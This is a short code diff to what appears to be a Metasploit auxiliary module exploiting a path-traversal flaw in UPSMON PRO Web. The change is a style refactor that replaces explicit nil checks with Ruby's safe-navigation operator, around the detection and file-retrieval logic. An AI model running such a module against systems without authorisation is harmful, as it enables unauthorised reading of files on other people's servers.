@@ -61,7 +61,7 @@ class MetasploitModule < Msf::Auxiliary
       return CheckCode::Unknown('Connection failed')
     end
 
-    if res && res.code == 200
+    if res&.code == 200
       data = res.to_s
       if data.include?('My Web Server 1') && data.include?('UPSMON PRO WEB')
         return CheckCode::Detected('UPSMON PRO Web seems to be running on target system.')
@@ -106,8 +106,7 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => normalize_uri(target_uri.path, traversal)
     })
 
-    fail_with(Failure::Unknown, 'No response from server.') if res.nil?
-    fail_with(Failure::UnexpectedReply, 'Non-200 returned from server. If you believe the path is correct, try increasing the path traversal depth.') if res.code != 200
+    fail_with(Failure::UnexpectedReply, 'Non-200 returned from server. If you believe the path is correct, try increasing the path traversal depth.') if res&.code != 200
     print_good("File retrieved: #{target_uri.path}#{traversal}")
 
     data = res.body
